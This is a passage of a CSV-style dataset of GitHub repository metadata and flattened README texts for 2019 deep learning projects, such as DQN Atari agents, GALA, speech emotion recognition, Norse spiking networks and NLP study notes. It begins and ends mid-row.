mistune 0 8 4 py37h14c39751000 conda forge mkl 2019 4 243 defaults mpc 1 1 0 hb20f59a1006 conda forge mpfr 4 0 2 ha14ba450 conda forge mpmath 1 1 0 py0 conda forge msgpack python 0 6 2 py37hc9558a20 conda forge nbconvert 5 6 0 py371 conda forge nbformat 4 4 0 py1 conda forge ncurses 6 1 hf484d3e1002 conda forge networkx 2 3 py0 conda forge ninja 1 9 0 h6bb024c0 conda forge nodejs 11 14 0 he1b5a441 conda forge notebook 6 0 0 py370 defaults numba 0 45 1 py37hb3f55d80 conda forge numexpr 2 6 9 py37h637b7d71000 conda forge numpy 1 16 5 py37h99e49ec0 defaults numpy base 1 16 5 py37h2f8d3750 defaults oauthlib 3 0 1 py0 conda forge olefile 0 46 py0 conda forge openssl 1 1 1c h516909a0 conda forge packaging 19 2 py0 conda forge pamela 1 0 0 py0 conda forge pandas 0 24 2 py37hb3f55d80 conda forge pandoc 2 7 3 0 conda forge pandocfilters 1 4 2 py1 conda forge parso 0 5 1 py0 conda forge partd 1 0 0 py0 conda forge patsy 0 5 1 py0 conda forge pexpect 4 7 0 py370 conda forge pickleshare 0 7 5 py371000 conda forge pillow 6 1 0 py37h6b7be261 conda forge pip 19 2 3 py370 conda forge prometheusclient 0 7 1 py0 conda forge prompttoolkit 2 0 9 py0 conda forge protobuf 3 9 2 py37he1b5a440 conda forge psutil 5 6 3 py37h516909a0 conda forge ptyprocess 0 6 0 py1001 conda forge pycosat 0 6 3 py37h14c39751001 conda forge pycparser 2 19 py371 conda forge pycurl 7 43 0 2 py37h16ce93b1 conda forge pygments 2 4 2 py0 conda forge pyjwt 1 7 1 py0 conda forge pyopenssl 19 0 0 py370 conda forge pyparsing 2 4 2 py0 conda forge pyrsistent 0 15 4 py37h516909a0 conda forge pysocks 1 7 1 py370 conda forge python 3 7 3 h33d41f41 conda forge python dateutil 2 8 0 py0 conda forge python editor 1 0 4 py0 conda forge pytorch 1 2 0 py3 7cuda10 0 130cudnn7 6 20 pytorch pytz 2019 2 py0 conda forge pywavelets 1 0 3 py37hd352d351 conda forge pyyaml 5 1 2 py37h516909a0 conda forge pyzmq 18 1 0 py37h17685290 conda forge readline 8 0 hf8c457e0 conda forge requests 2 22 0 py371 conda forge ruamelyaml 0 15 71 py37h14c39751000 conda forge scikit image 0 15 0 py37hb3f55d82 conda forge scikit learn 0 21 3 py37hcdab1310 conda forge scipy 1 3 1 py37h921218d2 conda forge seaborn 0 9 0 py1 conda forge send2trash 1 5 0 py0 conda forge setuptools 41 2 0 py370 conda forge six 1 12 0 py371000 conda forge sortedcontainers 2 1 0 py0 conda forge soupsieve 1 9 3 py370 conda forge sqlalchemy 1 3 8 py37h516909a0 conda forge sqlite 3 29 0 hcee41ef1 conda forge statsmodels 0 10 1 py37hc1659b70 conda forge sympy 1 4 py370 conda forge tblib 1 4 0 py0 conda forge tensorboard 1 14 0 py370 conda forge terminado 0 8 2 py370 conda forge testpath 0 4 2 py1001 conda forge tini 0 18 0 h14c39751001 conda forge tk 8 6 9 hed695b01003 conda forge toolz 0 10 0 py0 conda forge torchvision 0 4 0 py37cu100 pytorch tornado 6 0 3 py37h516909a0 conda forge tqdm 4 36 1 py0 conda forge traitlets 4 3 2 py371000 conda forge urllib3 1 25 5 py370 conda forge vincent 0 4 4 py1 conda forge wcwidth 0 1 7 py1 conda forge webencodings 0 5 1 py1 conda forge werkzeug 0 16 0 py0 conda forge wheel 0 33 6 py370 conda forge widgetsnbextension 3 5 1 py370 conda forge xlrd 1 2 0 py0 conda forge xz 5 2 4 h14c39751001 conda forge yaml 0 1 7 h14c39751001 conda forge zeromq 4 3 2 he1b5a442 conda forge zict 1 0 0 py0 conda forge zlib 1 2 11 h516909a1006 conda forge zstd 1 4 0 h3b9ef0a0 conda forge,2019-09-22T04:55:07Z,2019-12-07T20:53:34Z,Shell,timesler,User,1,5,1,12,master,timesler,1,0,0,0,0,0,0
Tsung-Ping,Harmony-Transformer,n/a,Harmony Transformer A multi task music harmony analysis model which aims to improve chord recognition through incorporating chord segmentation into the recognition process More details can be found in the paper Tsung Ping Chen and Li Su Harmony transformer incorporating chord segmentation into harmony recognition International Society of Music Information Retrieval Conference ISMIR November 2019 http archives ismir net ismir2019 paper 000030 pdf,2019-10-02T08:22:24Z,2019-12-10T01:59:47Z,Python,Tsung-Ping,User,1,5,1,4,master,Tsung-Ping,1,0,0,0,0,0,0
Mehdi0xC,RealTime-Pathfinding-Robot-with-Deep-Reinforcement-Learning,n/a,A Simple RealTime PathFinding Robot Based on Implementation of DQN Algoriththm on Xilinx Zynq ARM Cortex A Hard Processor My B Sc Thesis Phase 2 3 view details here,2019-10-17T14:17:57Z,2019-12-11T13:50:58Z,C++,Mehdi0xC,User,1,5,0,42,master,Mehdi0xC,1,0,0,0,0,0,0
KaleabTessera,DQN-Atari,atari#dqn#dqn-pytorch#machine-learning#pong#pytorch#reinforcement-learning,DQN Atari Deep Q network implementation for Pong vo https gym openai com envs Pong v0 The implementation follows from the paper Playing Atari with Deep Reinforcement Learning https arxiv org abs 1312 5602 and Human level control through deep reinforcement learning https web stanford edu class psych209 Readings MnihEtAlHassibis15NatureControlDeepRL pdf Results Video of Gameplay DQN Nature Paper DQN Video http img youtube com vi DcyMFIKsVNI 0 jpg http www youtube com watch v DcyMFIKsVNI DQN For Atari Pong Reward per Episode Rewards Per Episode results resultsperepisode png Summary of Implementation DQN Nature Architecture Implementation Input 84 84 4 image using the last 4 frames of a history Conv Layer 1 32 8 8 filters with stride 4 Conv Layer 2 64 4 4 filters with stride 2 Conv Layer 3 64 3 3 filters with stride 1 Fully Connected 1 fully connected and consists of 256 rectifier units Output fully connected linear layer with a single output for each valid action DQN Neurips Architecture Implementation Input 84 84 4 image using the last 4 frames of a history Conv Layer 1 16 8 8 filters with stride 4 Conv Layer 2 32 4 4 filters with stride 2 Fully Connected 1 fully connected and consists of 256 rectifier units Output fully connected linear layer with a single output for each valid action Other Params Optimizer RMSProp Batch Size 32 E greedy 0 1 How to run Create a new environment Example conda create n dqnpong Install Dependencies pip install r requirements txt To use gym wrappers Monitor to record the last episode sudo apt get install ffmpeg Run Training from Scratch python trainatari py Use a trained agent python trainatari py load checkpoint file results checkpointdqnnature pth View Progress A video is recorded every 50 episodes See videos in video folder,2019-09-26T21:01:43Z,2019-12-12T03:11:53Z,Python,KaleabTessera,User,1,5,0,18,master,KaleabTessera,1,0,0,1,0,1,0
facebookresearch,gala,n/a,Gossip based Actor Learner Architectures GALA This repo contains the implementation of GALA used for the experiments reported in Mido Assran Joshua Romoff Nicolas Ballas Joelle Pineau and Mike Rabbat Gossip based actor learner architectures for deep reinforcement learning Advances in Neural Information Processing Systems NeurIPS 2019 arxiv version https arxiv org abs 1906 04585 Environment Setup This code has been tested with Python 3 7 4 PyTorch 1 0 or higher The experiments reported in the paper were run using PyTorch 1 0 We have also tested this code with PyTorch 1 3 Install and Modify OpenAI Baselines We use a modified version of the OpenAI Baselines interface to run our experiments The modifications make it possible to efficiently run multiple environment instances in parallel on a server with multiple CPUs using Python s multiprocessing library Baselines for Atari preprocessing git clone https github com openai baselines git cd baselines pip install e After installing the latest version of baselines open the file baselines common vecenv shmemvecenv py go to the definition of ShmemVecEnv init and change the default value of context from spawn to fork Other requirements To install other requirements return to the GALA repo directory and run pip install r requirements txt Running the code As an example to use GALA A2C to train an agent to play the PongNoFrameskip v4 environment using 4 actor learners and 16 simulators per actor learner run OMPNUMTHREADS 1 python u main py env name PongNoFrameskip v4 user name USER seed 1 lr 0 0014 num env steps 40000000 save interval 500000 num learners 4 num peers 1 sync freq 100000000 num procs per learner 16 save dir galatest models Pong log dir galatest logs Pong This code produces one log file for each simulator The log file contains three columns the reward episode length and wall clock time recorded after every episode Acknowledgements This code is based on Ilya Kostrikov https github com ikostrikov s pytorch a2c ppo acktr gail repository https github com ikostrikov pytorch a2c ppo acktr gail We re also grateful to the authors of torchbeast https github com facebookresearch torchbeast We used a pre release version to obtain the comparison with Impala https arxiv org abs 1802 01561 reported in the paper License See the LICENSE file for details about the license under which this code is made available,2019-10-22T01:21:20Z,2019-11-20T02:06:33Z,Python,facebookresearch,Organization,3,5,1,1,master,mikerabbat,1,0,0,0,0,0,0
vishal240597,Speech-Emotion-Recognition-Using-Deep-CNN,n/a,Speech Emotion Recognition Introduction This repository handles building and training Speech Emotion Recognition System The basic idea behind this tool is to build and train test a suited machine learning as well as deep learning algorithm that could recognize and detects human emotions from speech This is useful for many industry fields such as making product recommendations affective computing etc Check this tutorial https www thepythoncode com article building a speech emotion recognizer using sklearn for more information Requirements Python 3 6 Python Packages librosa 0 6 3 numpy pandas soundfile 0 9 0 wave sklearn tqdm 4 28 1 matplotlib 2 2 3 pyaudio 0 2 11 ffmpeg https ffmpeg org optional used if you want to add more sample audio by converting to 16000Hz sample rate and mono channel which is provided in convertwavs py Install these libraries by the following command pip3 install r requirements txt Dataset This repository used 4 datasets including this repo s custom dataset which are downloaded and formatted already in data folder RAVDESS https zenodo org record 1188976 The R yson A udio V isual D atabase of E motional S peech and S ong that contains 24 actors 12 male 12 female vocalizing two lexically matched statements in a neutral North American accent TESS https tspace library utoronto ca handle 1807 24487 T oronto E motional S peech S et that was modeled on the Northwestern University Auditory Test No 6 NU 6 Tillman Carhart 1966 A set of 200 target words were spoken in the carrier phrase Say the word by two actresses aged 26 and 64 years EMO DB http emodb bilderbar info docu As a part of the DFG funded research project SE462 3 1 in 1997 and 1999 we recorded a database of emotional utterances spoken by actors The recordings took place in the anechoic chamber of the Technical University Berlin department of Technical Acoustics Director of the project was Prof Dr W Sendlmeier Technical University of Berlin Institute of Speech and Communication department of communication science Members of the project were mainly Felix Burkhardt Miriam Kienast Astrid Paeschke and Benjamin Weiss Custom Some unbalanced noisy dataset that is located in data train custom for training and data test custom for testing in which you can add remove recording samples easily by converting the raw audio to 16000 sample rate mono channel this is provided in createwavs py script in convertaudio audiopath method which requires ffmpeg https ffmpeg org to be installed and in PATH and adding the emotion to the end of audio file name separated with e g 20190616125714happy wav will be parsed automatically as happy Emotions available There are 9 emotions available neutral calm happy sad angry fear disgust ps pleasant surprise and boredom Feature Extraction Feature extraction is the main part of the speech emotion recognition system It is basically accomplished by changing the speech waveform to a form of parametric representation at a relatively lesser data rate In this repository we have used the most used features that are available in librosa https github com librosa librosa library including MFCC https en wikipedia org wiki Mel frequencycepstrum Chromagram MEL Spectrogram Frequency mel Contrast Tonnetz tonal centroid features Example 1 Using 3 Emotions The way to build and train a model for classifying 3 emotions is as shown below python from emotionrecognition import EmotionRecognizer from sklearn svm import SVC init a model let s use SVC mymodel SVC pass my model to EmotionRecognizer instance and balance the dataset rec EmotionRecognizer model mymodel emotions sad neutral happy balance True verbose 0 train the model rec train check the test accuracy for that model print Test score rec testscore check the train accuracy for that model print Train score rec trainscore Output Test score 0 8148148148148148 Train score 1 0 Determining the best model In order to determine the best model you can by python loads the best estimators from grid folder that was searched by GridSearchCV in gridsearch py and set the model to the best in terms of test score and then train it rec determinebestmodel train True get the determined sklearn model name print rec model class name is the best get the test accuracy score for the best estimator print Test score rec testscore Output MLPClassifier is the best Test Score 0 8958333333333334 Predicting Just pass an audio path to the rec predict method as shown below python this is a neutral speech from emo db print Prediction rec predict data emodb wav 15a04Nc wav this is a sad speech from TESS print Prediction rec predict data tessravdess validation Actor25 25010101mobsad wav Output Prediction neutral Prediction sad,2019-10-27T13:39:18Z,2019-11-21T07:14:10Z,Jupyter Notebook,vishal240597,User,1,5,0,18,master,vishal240597,1,0,0,1,0,1,1
pranjalchaubey,Optimized-Sentiment-Classification-using-Numpy,n/a,Optimized Sentiment Classification using Numpy A highly optimized version of Andrew Trask s Sentiment Classification from Deep Learning ND on Udacity I have taken Andrew Trask s http iamtrask github io Andre Trask s notebook on Sentiment Classification and have tried to hyper optimize a number of routines following a set of two rules 1 Use vectorization as much as possible 2 Avoid loops at all costs To search for the optimizations directly do a Ctrl F and look for the My Implementation tag You would use such techniques in writing production ready code in Python My optimizations are on an average 25 faster than the default solution with over 250 2 5x performance gain in a few places 2 5x performance improvement https github com pranjalchaubey Optimized Sentiment Classification using Numpy blob master img optim1 png 2 5x performance improvement https github com pranjalchaubey Optimized Sentiment Classification using Numpy blob master img optim1 png 2 5x performance improvement PS I think Andrew Trask didn t use the complicated expressions in order to keep the whole tutorial beginner friendly Kudos to him,2019-10-13T18:13:35Z,2019-10-21T19:50:36Z,Jupyter Notebook,pranjalchaubey,User,1,5,0,8,master,pranjalchaubey,1,0,0,0,0,0,0
Apress,advanced-applied-deep-learning,n/a,Apress Source Code This repository accompanies Advanced Applied Deep Learning https www apress com 9781484249758 by Umberto Michelucci Apress 2019 comment cover Cover image 9781484249758 jpg Download the files as a zip using the green button or clone the repository to your machine using Git Releases Release v1 0 corresponds to the code in the published book without corrections or updates Contributions See the file Contributing md for more information on how you can contribute to this repository,2019-09-30T14:36:55Z,2019-11-27T17:15:41Z,Jupyter Notebook,Apress,Organization,3,4,10,0,master,,0,0,0,0,0,0,0
haipinglu,SimplyDeep,n/a,SimplyDeep A Simple Introduction to Deep Learning Haiping Lu University of Sheffield Simple is the key focus here If you think this can be made simpler let me know please Why We are teaching a class of 200 MSc students with diverse background We need to transform a traditional machine learning course MLAI https github com maalvarezl MLAI without much deep learning to a modern one with these cool words Based on my experience in co developing Scalable Machine Learning https github com haipinglu ScalableML for three years from scratch this project aims to give a simple introduction to deep learning bridge our traditional materials with modern materials reduce remove unnecessary materials in existing sources to focus on the core concepts How Most materials will be adapted from internet sources with acknowledgement properly given If you find I ve used your materials but did not acknowledge it please let me know and I will fix it as soon as I can For transition I will introduce these materials in small blocks at the end of each traditional machine learning lecture The objective is to keep things as simple as possible and make our transition as smooth as possible Feedback from all is essential to grow this project and benefit more Thank you What We will cover the following topics Session 1 Linear Regression with PyTorch Session 2 Unsupervised Feature Learning with PyTorch Session 3 Convolutional neural network for image classification GPU GPU computing will be lightly touched only Those interested are encouraged to refer to references and try out free GPU access provided by Google https towardsdatascience com kaggle vs colab faceoff which free gpu provider is tops d4f0cd625029 if you do not have one yet Acknowledgement The materials were built with references to the following sources The PyTorch Tutorial https pytorch org tutorials The PyTorch Examples https github com pytorch examples The PyTorch Documentations https pytorch org docs stable index html The PyTorch package source https github com pytorch pytorch Udacity s Deep Learning PyTorch https github com udacity deep learning v2 pytorch If you find I ve used your materials but did not acknowledge it please let me know and I will fix it as soon as I can Many thanks to Welcome your names here,2019-10-30T18:40:47Z,2019-11-30T09:09:55Z,Jupyter Notebook,haipinglu,User,3,4,5,59,master,haipinglu#skitimoon,2,0,0,0,0,0,1
Apress,building-ml-and-dl-models-on-gcp,n/a,Apress Source Code This repository accompanies Building Machine Learning and Deep Learning Models on Google Cloud Platform https www apress com 9781484244692 by Ekaba Bisong Apress 2019 comment cover Cover image 9781484244692 jpg Download the files as a zip using the green button or clone the repository to your machine using Git Releases Release v1 0 corresponds to the code in the published book without corrections or updates Contributions See the file Contributing md for more information on how you can contribute to this repository,2019-10-10T17:04:55Z,2019-12-04T03:56:55Z,Jupyter Notebook,Apress,Organization,3,4,9,3,master,dvdbisong,1,1,1,0,0,0,0
ishfaq06,Deep-Q-Learning-based-Downlink-Power-Allocation,n/a,Deep Q Learning based Downlink Power Allocation DQL with Experience Replay To simulate environment and to run DQL agent run python dqlmain py Testing For comparison purpose the optimal data is obtained through Genetic Algorithm To generate optimal data run python datagenerator py,2019-10-29T16:07:16Z,2019-11-05T11:39:16Z,Python,ishfaq06,User,1,4,3,7,master,ishfaq06,1,0,0,0,0,0,0
electronicvisions,norse,deep-learning#machine-learning#neuromorphic-computing#python#pytorch#spiking-neural-networks#tensors,Norse A library to do deep learning https en wikipedia org wiki Deeplearning with spiking neural networks https en wikipedia org wiki Spikingneuralnetwork Test Status https github com norse norse workflows Python 20package badge svg https github com norse norse actions The purpose of this library is to exploit the advantages of bio inspired neural components who are sparse and event driven a fundamental difference from artificial neural networks Norse expands PyTorch https pytorch org with primitives for bio inspired neural components bringing you two advantages a modern and proven infrastructure based on PyTorch and deep learning compatible spiking neural network components Documentation https norse github io norse build html index html Example usage template tasks Norse comes packed with a few example tasks such as MNIST https en wikipedia org wiki MNISTdatabase but is generally meant for use in specific deep learning tasks see below section on long short term spiking neural networks bash python runmnist py Getting Started Norse is a machine learning library that builds on the PyTorch https pytorch org infrastructure While we have a few tasks included it is meant to be used in designing and evaluating experiments involving biologically realistic neural networks This readme explains how to install norse and apply it in your own experiments Installation Note that this guide assumes you are on a terminal friendly environment with access to the pip python and git commands Python version 3 7 is required Installing from PyPi bash pip install norse Installing from source python git clone https github com norse norse cd norse python setup py install The primary dependencies of this project are torch https pytorch org tensorboard https www tensorflow org tensorboard and OpenAI gym https github com openai gym A more comprehensive list of dependencies can be found in requirements txt requirements txt Running examples The directory norse task norse task contains three example experiments serving as short self contained correct examples SSCCE http www sscce org You can execute them by invoking the run py scripts from the base directory To train an MNIST classification network invoke python runmnist py To train a CIFAR classification network invoke python runcifar py To train the cartpole balancing task with Policy gradient invoke python rungym py The default choices of hyperparameters are meant as reasonable starting points Example on using the library Long short term spiking neural networks long short term spiking neural networks from the paper by G Bellec D Salaj A Subramoney R Legenstein and W Maass https arxiv org abs 1803 09574 is one interesting way to apply norse python from norse torch module import LSNNLayer LSNNCell LSNNCell with 2 inputs and 10 outputs layer LSNNLayer LSNNCell 2 10 5 batch size running on CPU state layer initialstate 5 cpu Generate data of shape 5 2 10 data torch zeros 2 5 2 Tuple of output data and layer state output newstate layer forward data state Similar work A number of projects exist that attempts to leverage the strength of bio inspired neural networks however none of them are fully integrated with modern machine learning libraries such as Torch or Tensorflow https www tensorflow org Norse was created for two reasons to 1 apply findings from decades of research in practical settings and to 2 accelerate our own research within bio inspired learning The below list of projects serves to illustrate the state of the art while explaining our own incentives to create and use norse SNN toolbox https snntoolbox readthedocs io en latest guide intro html This toolbox automates the conversion of pre trained analog to spiking neural networks The tool is solely for already trained networks and omits the possibly platform specific training Neuron Simulation Toolkit NEST https nest simulator org NEST constructs and evaluates highly detailed simulations of spiking neural networks This is useful in a medical biological sense but maps poorly to large datasets and deep learning Nengo DL https www nengo ai nengo dl introduction html Nengo is a neuron simulator and Nengo DL is a deep learning network simulator that optimised spike based neural networks based on an approximation method suggested by Hunsberger and Eliasmith 2016 https arxiv org abs 1611 05141 This approach maps to but does not build on the deep learning framework Tensorflow which is fundamentally different from incorporating the spiking constructs into the framework itself Contributing Please refer to the contributing md contributing md Credits Norse is created by Christian Pehle https www kip uni heidelberg de people 10110 GitHub cpehle https github com cpehle doctoral student at University of Heidelberg Germany Jens E Pedersen https www kth se profile jeped GitHub jegp https github com jegp doctoral student at KTH Royal Institute of Technology Sweden License LGPLv3 See LICENSE LICENSE for license details,2019-10-24T11:02:59Z,2019-11-28T11:59:59Z,Python,electronicvisions,Organization,5,4,2,45,master,cpehle#Jegp#muffgaga,3,1,1,0,1,0,3
675491918,DeepLearning_MNIST_Halcon,classification#deeplearning#halcon#mnist,DeepLearningMNIST https www 51halcon com thread 3881 1 1 html HalconHalconhttps blog csdn net xuanbi8560 article details 80911015 1 1 1 mnistimagesTrainimagesTestimages 1 2 Halconpreprocessdlclassifierimages mnistimagesPreprocessedimages 2 2 1 BatchSizeNumEpochsLearningRateTrainingPercentValidationPercent LearningRate Epoch InitialLearningRate Math Pow LearningRateStepRatio Math Floor Epoch LearningRateStepEveryNthEpoch 2 2 2 3 classifier hdl hdl 2 4 3 3 1 12 3 2,2019-10-30T12:54:36Z,2019-12-05T02:14:43Z,C#,675491918,User,1,4,1,17,master,675491918#xtiger91,2,0,0,0,0,0,0
maziarraissi,DeepTurbulence,n/a,DeepTurbulence Deep Learning of Turbulent Scalar Mixing Citation articleraissi2018DeepTurbulence title Deep Learning of Turbulent Scalar Mixing author Raissi Maziar and Babaee Hessam and Givi Peyman journal arXiv preprint arXiv 1811 07095 year 2018,2019-10-06T22:10:12Z,2019-11-01T19:55:42Z,Mathematica,maziarraissi,User,1,4,2,3,master,maziarraissi,1,0,0,0,0,0,0
xiaqiong,DeepResolution,n/a,DeepResolution Deep Learning Based Multivariate Curve Resolution Deep Learning Based Multivariate Curve Resolution DeepResolution method has been proposed for automatic resolution of GC MS data It has excellent performance in resolving overlapping peaks and is suitable for large scale data analysis Compared with the classical multi curve resolution method it has the characteristics of fast accurate scalable and fully automatic Installation python and TensorFlow Python 3 5 2available at https www python org https www python org TensorFlow version 1 14 0 GPU available at https github com tensorflow https github com tensorflow Install dependent packages The packages mainly include numpy Scipy Matplotlib pandas sklearn csv and os These packages are included in the integration tool Anaconda https www anaconda com https www anaconda com Clone the repository and run it directly git clone https github com xiaqiong DeepResolution Download the model and example data Since the model exceeded the limit we have uploaded all the models and the information of mixtures to the google drive Download https drive google com open id 19y6JYQY0VNkGMmjCi1EF1EcMvDOdXn Contact Xiaqiong Fan xiaqiongfan csu edu cn,2019-09-23T10:52:47Z,2019-11-25T15:18:48Z,Python,xiaqiong,User,1,4,0,12,master,xiaqiong,1,0,0,0,0,0,0
krishnaik06,Deployment-Deep-Learning-Heroku,n/a,Deployment Deep Learning Heroku,2019-10-09T05:35:22Z,2019-12-13T09:57:53Z,n/a,krishnaik06,User,1,4,0,1,master,krishnaik06,1,0,0,0,0,0,0
machinelearningmindset,deep-learning-nlp-roadmap,n/a,deep learning nlp roadmap,2019-09-27T03:58:20Z,2019-10-01T06:59:25Z,n/a,machinelearningmindset,Organization,1,4,0,1,master,astorfi,1,0,0,0,0,0,0
suyoung-lee,Episodic-Backward-Update,n/a,Episodic Backward Update Lasagne Theano based implementation of Sample Efficient Deep Reinforcement Learning via Episodic Backward Update https arxiv org abs 1805 12375 NeurIPS 2019 Episodic Backward Update EBU with a constant diffusion factor for the ATARI environment is uploaded Dependencies Numpy Scipy Pillow Matplotlib Lasagne ALE Theano 0 9 0 Our implementation is based on Shibi He s implementation https github com ShibiHe Q Optimality Tightening of Optimality Tightening https arxiv org abs 1611 01606 which is based on Nathan Sprague s implementation of deep Q RL https github com spragunr deepqrl Please refer to https github com spragunr deepqrl https github com spragunr deepqrl for installing the dependencies We ran the code with CUDA 8 0 CUDNN 5 1 5 TITAN Xp Major changes from the deep Q RL https github com spragunr deepqrl implementation aleagents py dotraining generate temporary target Q table and update aledataset py randomepisode sample an episode instead of a minibatch of transitions aleexperiment py run runepoch runepisode fixed to apply the Nature DQN setting so that each episode is played at most 4 500 steps 18 000 frames or 5 minutes launcher py contains a hyperparameter beta for the diffusion factor Running You can train an EBU agent with a constant diffusion factor 0 5 in breakout using random seed 12 on gpu0 as follows THEANOFLAGS device gpu0 allowgc False python code runEBU py r breakout Seed 12 beta 0 5 By default it returns the test scores at every 62 500 steps for 40 times 62 500 steps x 4 frames step x 40 10M frames in total You may modify the STEPSPEREPOCH and EPOCHS parameter in runEBU py to change the total number of training steps and the frequency of evaluation You will see the process as below if everything runs fine running https user images githubusercontent com 26214784 65491773 aac10200 deea 11e9 9b5c 6c80c41c178e png,2019-09-24T00:39:24Z,2019-12-14T08:25:49Z,Python,suyoung-lee,User,1,4,3,42,master,suyoung-lee,1,0,0,0,0,0,0
obitolyz,Online-Vehicle-Routing-DRL,n/a,Online Vehicle Routing with Deep Reinforcement Learning,2019-10-05T16:02:34Z,2019-12-03T10:48:49Z,Python,obitolyz,User,1,4,4,81,master,obitolyz#yokimZhang,2,0,0,0,0,0,5
Apress,beginning-anomaly-detection-using-python-based-dl,n/a,Apress Source Code This repository accompanies Beginning Anomaly Detection Using Python Based Deep Learning https www apress com 9781484251768 by Sridhar Alla and Suman Adari Apress 2019 comment cover Cover image 9781484251768 jpg Download the files as a zip using the green button or clone the repository to your machine using Git Releases Release v1 0 corresponds to the code in the published book without corrections or updates Contributions See the file Contributing md for more information on how you can contribute to this repository,2019-10-15T20:24:12Z,2019-12-12T16:32:23Z,Jupyter Notebook,Apress,Organization,2,4,4,3,master,MarkP88#sridharalla#sidalla,3,0,0,0,0,0,0
jcborges,DeepStack,deep-learning-ensembles#keras-models,DeepStack DeepStack Ensembles for Deep Learning Travis https travis ci com jcborges DeepStack svg branch master https travis ci com jcborges DeepStack PyPI version https badge fury io py deepstack svg https badge fury io py deepstack Download Stats https img shields io pypi dm deepstack color bright 20green label installs logoColor bright 20green https pypistats org packages deepstack DeepStack is a Python module for building Deep Learning Ensembles originally built on top of Keras and distributed under the MIT license Installation pip install deepstack Stacking Stacking is based on training a Meta Learner on top of pre trained Base Learners DeepStack offers an interface to fit the Meta Learner on the predictions of the Base Learners In the following an Example based on top of pre trained Keras Models there is also an interface for generic models Stacking png Usage python from deepstack base import KerasMember For a generic i e Non Keras Model check the class Member from deepstack ensemble import StackEnsemble model1 A Keras pre trained Model Base Learner trainbatches1 A numpy tuple Xtrain ytrain or Keras Data Iterator Training Data for Meta Learner valbatches1 A numpy tuple Xval yval or Keras Data Iterator Validation Data for Meta Learner member1 KerasMember name Model1 kerasmodel model1 trainbatches trainbatches1 valbatches valbatches1 model2 trainbatches2 valbatches2 member2 KerasMember name Model2 kerasmodel model2 trainbatches trainbatches2 valbatches valbatches2 stack StackEnsemble stack addmember member1 Assumption the data iterators of base learners iterate over the same data and have same shape and classes stack addmember member2 stack fit Fits meta learner based on training batches from its members base learners stack describe Prints information about ensemble performance based on validation data Check an example on the CIFAR 10 dataset Cifar10 py examples Cifar10 py Randomized Weighted Ensemble Ensemble Technique that weights the prediction of each ensemble member combining the weights to calculate a combined prediction Weight optimization search is performed with randomized search based on the dirichlet distribution on a validation dataset WeightedEnsemble png It follows the same interface of the StackEnsemble An example can be found in Cifar10 py examples Cifar10 py Citing DeepStack If you use DeepStack in a scientific publication we would appreciate citations bibtex misc title DeepStack Ensembles for Deep Learning author Julio Borges url https github com jcborges DeepStack date 2019,2019-10-01T10:23:21Z,2019-11-18T19:17:38Z,Python,jcborges,User,2,4,0,35,master,jcborges,1,6,8,0,0,0,10
WangGodder,deep-cross-modal-hashing,n/a,torch cross modal hashing torchcmh torchcmh is a library built on PyTorch for deep learning cross modal hashing if you want use the dataset i make please download mat file and image file by readme file in dataset package you need to install these package to run visdom 0 1 8 pytorch 1 0 0 tqdm 4 0 how to using create a configuration file as script defaultconfig yml yaml training the name of python file in training method DCMH the data set name you can choose mirflickr25k nus wide ms coco iapr tc 12 dataName Mirflickr25K batchSize 64 the bit of hash codes bit 64 if true the program will be run on gpu cuda True the device id you want to use if you want to multi gpu you can use id1 id2 device 0 datasetPath Mirflickr25k the path you download the image of data set imgdir I datasetmirflickr25kmirflickr run script main py and input configuration file path python from torchcmh run import run if name main run configpath defaultconfig yml how to create your method create new method file in folder torchcmh training inherit implement TrainBase change the training method as your python file name in config yml file and run some function in TrainBase data visualization python def plotloss self title str lossstore None if lossstore is None lossstore self lossstore if self plotter for name loss in lossstore items self plotter plot title name loss avg valid python for epoch in range self maxepoch training codes self valid epoch,2019-10-14T09:28:44Z,2019-12-10T08:02:03Z,Python,WangGodder,User,1,4,0,28,master,WangGodder,1,0,0,0,0,0,0
javiabellan,nlp,n/a,URGENT Multifit post http nlp fast ai classification 2019 09 10 multifit html paper https arxiv org abs 1909 04761 see this 5 videos https www youtube com playlist list PLIG2x2RJ4LTF IIu7 J3yyg8LRe1WZq Natural Language Processing Index Theory Pipeline pipeline Models Recurrent Convolutional recurrent convolutional models Transformers transformers models Transfer Learning pipeline Losses losses Metrics metrics Applications Language Model language model Clasification clasification Translation translation Summarization summarization Chatbot chatbot Resources resources Theory Pipeline 1 Preprocess Tokenization Split the text into sentences and the sentences into words Lowercasing Usually done in Tokenization Punctuation removal Remove words like Usually done in Tokenization Stopwords removal Remove words like and the him Done in the past Lemmatization Verbs to root form organizes will organize organizing organize This is better Stemming Nouns to root form democratic democratization democracy This is faster 2 Extract features Document features Bag of Words BoW Counts how many times a word appears in a text It can be normalize by text lenght TF IDF Measures relevance for each word in a document not frequency like BoW N gram Probability of N words together Sentence and document vectors paper2014 https arxiv org abs 1405 4053 paper2017 https arxiv org abs 1705 02364 Word features Word Vectors Unique representation for every word independent of its context Word2Vec https arxiv org abs 1310 4546 By Google in 2013 GloVe By Standford FastText By Facebook Contextualized Word Vectors Good for polysemic words meaning depend of its context CoVE https arxiv org abs 1708 00107 in 2017 ELMO https arxiv org abs 1802 05365 Done with with bidirectional LSTMs By allen Institute in 2018 Transformer encoder Done with with self attention 3 Build model Bag of Embeddings Linear algebra matrix decomposition Latent Semantic Analysis LSA that uses Singular Value Decomposition SVD Non negative Matrix Factorization NMF Latent Dirichlet Allocation LDA Good for BoW Neural nets Recurrent NNs decoder LSTM GRU Transformer decoder GPT BERT Hidden Markov Models Others Regular expressions Regex Find patterns Parse trees Syntax od a sentence Tokenization Character tokenization Subword tokenization The best used in recent models Word tokenization Used in traditional NLP Subword tokenization https medium com makcedward how subword helps on your nlp model 83dd1b836f46 WordPiece Used in BERT Byte Pair Encoding BPE https arxiv org abs 1508 07909 Used in GPT 2 2016 Unigram Language Model https arxiv org abs 1804 10959 2018 SentencePiece https arxiv org pdf 1808 06226 pdf 2018 BPE tokenization of the word subwords N gram Probability of N words together Read this https deepai org machine learning glossary and terms n gram Example Toy corpus I like apples I like oranges I do not like broccoli Then P I like P I P like I 1 0 66 0 66 P I like apples P I P like I P apples like 1 0 66 0 5 0 33 Recurrent Convolutional models RNN Recurrent Nets No parallel tokens GRU LSTM AWD LSTM regular LSTM with tuned dropout hyper parameters CNN Convolutional Nets Parallel tokens Lightweight Dynamic Convs https arxiv org abs 1901 10430 QRNN https arxiv org abs 1611 01576 Quasi Recurrent Net Used in MultiFiT Tricks Teacher forcing Feed to the decoder the correct previous word insted of the predicted previous word at the beggining of training Attention Learns weights to perform a weighted average of the words embeddings Transformers models Self Attention 